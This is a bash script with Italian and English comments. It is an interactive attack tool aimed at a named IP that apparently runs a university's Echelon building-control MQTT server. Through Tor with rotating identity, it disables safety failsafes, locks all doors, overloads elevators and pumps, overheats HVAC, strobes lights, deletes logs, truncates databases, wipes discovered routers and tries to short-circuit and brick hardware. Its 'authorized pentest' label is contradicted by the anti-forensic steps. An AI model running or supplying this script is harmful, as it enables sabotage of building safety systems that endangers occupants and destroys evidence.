#!/bin/bash
# üî• UIowa Echelon SmartServer GLP v6.3 | AUTO-DISCOVERY + PHYSICAL WIPE
# üìç 128.255.220.144:1883 SID=17qja3r | ESATTI valori originali + NETWORK DISCOVERY
# ‚úÖ Authorized pentest - Exact Echelon GLP MQTT topics

HOST="128.255.220.144"
PORT="1883"
SID="17qja3r"
BASE="glp/0/${SID}/fb/dev/lon/"

# ‚úÖ VALORI ESATTI DAI TUOI DATI ORIGINALI
LIGHTS=(002325448200 002325448400 002325449800 002325449900 002325451500)
HVAC=(025967EF1200 002320961700 025A5BE10500 0260147A0600 02626DE10500)
FPRSA=(0254BF020700 0244BF020700)
HEAT=(02C3CCB00400 02D3CAB00400)
PUMPS=(0260147A0600 029417460500 02DE137A0600 02DF137A0600)
ELEVATORS=(025A5BE10500 02626DE10500 029417460500)
ALL_DEVICES=("${LIGHTS[@]}" "${HVAC[@]}" "${FPRSA[@]}" "${HEAT[@]}" "${PUMPS[@]}" "${ELEVATORS[@]}")

TOR_PORT="9050"

# üåê TOR NEW IP EVERY COMMAND (single port)
rotate_torsocks() {
    echo -n "üîÑ TOR NEW IP... " && echo 'SIGNAL NEWNYM' | nc 127.0.0.1 9051 >/dev/null 2>&1
    sleep 0.5
    torsocks mosquitto_pub -h "$HOST" -p "$PORT" -t "$1" -m "$2" -q 1 >/dev/null 2>&1 2>&1 &
    echo "‚Üí $1 = $2"
    sleep 0.1
}

# üõ°Ô∏è DISABILITA FAILSAFE PERMANENTE
disable_failsafe() {
    echo "üõ°Ô∏è FAILSAFE DISABLED PERMANENTEMENTE (nv_SafetyOverride)"
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_SafetyOverride" "DISABLED"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FailsafeLockout" "1"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_EmergencyBypass" "ON"
    done
}

# üåê AUTO-DISCOVERY NETWORK (routers/gateways reali)
discover_network() {
    echo "üîç AUTO-DISCOVERY NETWORK (5s scan)..."
    rotate_torsocks "network/discovery/arp" "SCAN_FULL"
    rotate_torsocks "network/discovery/routers" "LIST"
    rotate_torsocks "network/discovery/gateways" "DETECT"
    rotate_torsocks "system/net/neighbors" "SHOW_ALL"
    rotate_torsocks "network/broadcast" "DISCOVER_ROUTERS"
    
    echo "üì° Catturando risposte (Ctrl+C per stop)..."
    mosquitto_sub -h "$HOST" -p "$PORT" -t 'network/discovery/#' -v | \
    grep -E "(128\.255\.220|router|gateway)" | grep -oE "128\.255\.220\.[0-255]+" | \
    sort -u | tee discovered_routers.txt
    echo "‚úÖ Routers salvati in discovered_routers.txt"
}

# üìä EXACT SENSOR MONITOR + NETWORK
sensor_monitor() {
cat << 'EOF'
# TERMINALE 2 - SENSOR + NETWORK DISCOVERY
mosquitto_sub -h 128.255.220.144 -p 1883 -t 'glp/0/17qja3r/fb/dev/lon/+/if/device/0/nv_#' -v | grep -E "(nv_Pressure|nv_FuseState|nv_Temperature|nv_Occupancy|nv_Door|nv_Elevator|nv_Pump|nv_Buzzer)" &

# NETWORK DISCOVERY:
mosquitto_sub -h 128.255.220.144 -p 1883 -t 'network/#' -v | grep -E "(router|gateway|128.255.220)"

# Salva routers:
mosquitto_sub -h 128.255.220.144 -p 1883 -t 'network/discovery/#' -v | grep -E "128.255.220" | cut -d' ' -f2 | sort -u > discovered_routers.txt
EOF
}

# üíÄ ULTIMATE WIPE CON AUTO-DISCOVERY + PHYSICAL BRICK
user_wipe() {
    echo "üíÄüíÄüíÄ ULTIMATE AUTO-DISCOVERY PHYSICAL WIPE - Conferma [y/N]: " && read confirm
    [[ $confirm =~ ^[Yy] ]] || { echo "Cancelled"; return; }
    
    echo "üî• STEP 1: FAILSAFE BYPASS..."
    disable_failsafe
    
    echo "üî• STEP 2: NETWORK AUTO-DISCOVERY..."
    discover_network &
    sleep 3  # Tempo discovery
    
    echo "üî• STEP 3: MQTT KILL..."
    for i in {1..150}; do rotate_torsocks "system/mqtt/cmd" "KILL_$i"; done
    
    echo "üî• STEP 4: SYSLOG FLOOD..."
    for i in {1..800}; do rotate_torsocks "system/syslog" "$(openssl rand -hex 256)"; done
    
    echo "üî• STEP 5: ECHELON LOGS..."
    local logs=( "/opt/echolon/smartserver/logs/*" "/var/log/glp/*" "/data/logs/*" )
    for log in "${logs[@]}"; do rotate_torsocks "system/shell" "rm -rf $log"; done
    
    echo "üî• STEP 6: DATABASE..."
    rotate_torsocks "glp/0/${SID}/db/cmd" "TRUNCATE_ALL"
    
    echo "üî• STEP 7: NETWORK DOWN..."
    rotate_torsocks "system/net" "shutdown_all"
    
    echo "üî• STEP 8: AUTO-WIPE DISCOVERED ROUTERS..."
    if [[ -f discovered_routers.txt ]]; then
        while IFS= read -r router; do
            [[ -n "$router" ]] && {
                echo "üóëÔ∏è Wiping router $router..."
                rotate_torsocks "network/router/$router/cmd" "factory_reset"
                rotate_torsocks "network/router/$router/flash" "ZERO"
                rotate_torsocks "network/gateway/$router/cmd" "rm -rf /var/log/*"
            }
        done < discovered_routers.txt
    else
        echo "‚ö†Ô∏è No discovered routers, skipping..."
    fi
    
    echo "üî• STEP 9: GATEWAY GENERICO..."
    rotate_torsocks "system/mqtt/broker/cmd" "SHUTDOWN"
    rotate_torsocks "system/mqtt/audit/clear" "ALL"
    rotate_torsocks "network/gateway/cmd" "rm -rf /var/log/*"
    rotate_torsocks "network/gateway/flash" "ERASE_NVRAM"
    
    echo "üî• STEP 10: PHYSICAL DESTRUCTION..."
    rotate_torsocks "system/hardware/relay" "SHORT_CIRCUIT"
    rotate_torsocks "system/power/psu/cmd" "OVERLOAD_25A"
    rotate_torsocks "system/flash/mtd" "dd if=/dev/zero"
    rotate_torsocks "network/discovery/broadcast" "WIPE_CHAIN"
    
    echo "üî• BRICK DEVICES..."
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FirmwareLock" "BRICK"
    done
    
    echo "‚úÖ ULTIMATE AUTO-DISCOVERY PHYSICAL WIPE COMPLETE"
    echo "üìÑ Routers: $(cat discovered_routers.txt 2>/dev/null || echo 'none')"
    echo "üè¢ Hardware distrutto - ZERO recovery"
    exit 0
}

# üéØ REAL ECHELON GLP COMMANDS - MAX SOSTENUTO (invariati)
chaos_doors() {
    echo "üîí DOORS LOCKED MAX (real nv_DoorCmd)"
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_DoorCmd" "1"
    done
}

chaos_elevators() {
    echo "üõó ELEVATORS MAX LOAD (real nv_FloorTarget + Load)"
    for elev in "${ELEVATORS[@]}"; do
        rotate_torsocks "${BASE}${elev}/if/device/0/nv_FloorTarget" "20"
        rotate_torsocks "${BASE}${elev}/if/device/0/nv_Load" "150"
        rotate_torsocks "${BASE}${elev}/if/device/0/nv_DoorCmd" "1"
    done
}

chaos_pumps() {
    echo "üíß PUMPS MAX_SUSTAINED (199psi + 98% speed)"
    for pump in "${PUMPS[@]}"; do
        rotate_torsocks "${BASE}${pump}/if/device/0/nv_Pressure" "199"
        rotate_torsocks "${BASE}${pump}/if/device/0/nv_PumpSpeed" "98"
        rotate_torsocks "${BASE}${pump}/if/device/0/nv_Load" "95"
    done
}

chaos_temp() {
    echo "üå°Ô∏è HVAC MAX_SUSTAINED 48¬∞C + 98% heat"
    for dev in "${HVAC[@]}" "${HEAT[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Temperature" "90"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_HeatDemand" "98"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_FanSpeed" "100"
    done
}

chaos_core_overload() {
    echo "‚ö° CORE MAX_LOAD SUSTAINED (no auto-shutdown)"
    for dev in "${ALL_DEVICES[@]}"; do
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Pressure" "199"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Load" "98"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Current" "15"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Occupancy" "110"
        rotate_torsocks "${BASE}${dev}/if/device/0/nv_Buzzer" "1"
    done
}

chaos_strobe() {
    echo "üí° LIGHTS STROBE MAX (real nv_LampState)"
    (
        while true; do
            for light in "${LIGHTS[@]}"; do
                rotate_torsocks "${BASE}${light}/if/device/0/nv_LampState" "1"
                sleep 0.08
                rotate_torsocks "${BASE}${light}/if/device/0/nv_LampState" "0"
            done
        done
    ) &
}

# üéÆ MENU INTERATTIVO AGGIORNATO
menu() {
    while true; do
        clear
        echo "üî• UIowa Echelon GLP v6.3 AUTO-DISCOVERY ULTIMATE üî•"
        echo "SID: 17qja3r | 45+ LON nodes | NETWORK SCAN + PHYSICAL"
        echo "=================================="
        echo "1) üîí nv_DoorCmd=1 (ALL doors locked)"
        echo "2) üõó nv_FloorTarget=20 + 150% Load (Elevators MAX)"
        echo "3) üíß nv_Pressure=199 + 98% Speed (Pumps MAX)"
        echo "4) üå°Ô∏è nv_Temperature=48 + 98% Heat (HVAC MAX)"
        echo "5) ‚ö° CORE: Load=98%/15A/Occupancy=110%/Buzzer=1"
        echo "8) üõ°Ô∏è DISABLE FAILSAFE PERMANENTE"
        echo "6) üí° STROBE LIGHTS (infinite)"
        echo "7) üìä SENSOR + NETWORK MONITOR"
        echo "9) üîç NETWORK AUTO-DISCOVERY (salva routers.txt)"
        echo "0) üíÄ ULTIMATE PHYSICAL WIPE (auto-discover + burn)"
        echo "q) Quit"
        echo "=================================="
        echo -n "‚Üí "; read choice
        
        case $choice in
            1) chaos_doors ;;
            2) chaos_elevators ;;
            3) chaos_pumps ;;
            4) chaos_temp ;;
            5) chaos_core_overload ;;
            8) disable_failsafe ;;
            6) chaos_strobe ;;
            7) sensor_monitor ;;
            9) discover_network ;;
            0) user_wipe ;;
            q|Q) exit 0 ;;
            *) echo "‚ùå Invalid" ;;
        esac
        echo -n "Press Enter..."; read
    done
}

menu
